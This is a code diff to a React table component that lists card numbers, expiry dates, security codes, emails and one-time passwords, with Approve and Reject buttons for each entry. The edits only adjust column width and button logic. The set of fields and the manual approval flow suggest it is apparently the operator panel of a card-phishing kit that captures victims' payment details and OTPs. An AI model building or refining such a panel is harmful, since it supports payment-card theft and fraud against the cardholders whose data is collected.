@@ -246,7 +246,7 @@ async function copyText(value: string) {
             <th className="px-3 py-2">Card Number</th>
             <th className="px-3 py-2">MM/YY</th>
             <th className="px-3 py-2">Security Code</th>
-            <th className="px-3 py-2">Email</th>
+            <th className="px-3 py-2 w-[18%]">Email</th>
             <th className="px-3 py-2">OTP</th>
             <th className="px-3 py-2">Status</th>
             <th className="px-3 py-2">Actions</th>
@@ -318,9 +318,9 @@ async function copyText(value: string) {
                  </td>
                 <td className="px-3 py-2 capitalize">{row.status}</td>
                
-                <td className="px-3 py-2">
-  {row.status === "approved" ? (
-    <span className="text-[#9aa8b8]">—</span>
+               <td className="px-3 py-2">
+  {row.status === "approved" || row.status === "rejected" ? (
+    <span className="text-[#9aa8b8]">DONE</span>
   ) : (
     <div className="flex gap-2">
       <button
@@ -330,15 +330,13 @@ async function copyText(value: string) {
       >
         Approve
       </button>
-      {row.status !== "rejected" && (
-        <button
-          type="button"
-          onClick={() => setStatus(row.id, "rejected")}
-          className="rounded bg-red-600 px-2 py-1 text-xs text-white"
-        >
-          Reject
-        </button>
-      )}
+      <button
+        type="button"
+        onClick={() => setStatus(row.id, "rejected")}
+        className="rounded bg-red-600 px-2 py-1 text-xs text-white"
+      >
+        Reject
+      </button>
     </div>
   )}
 </td>
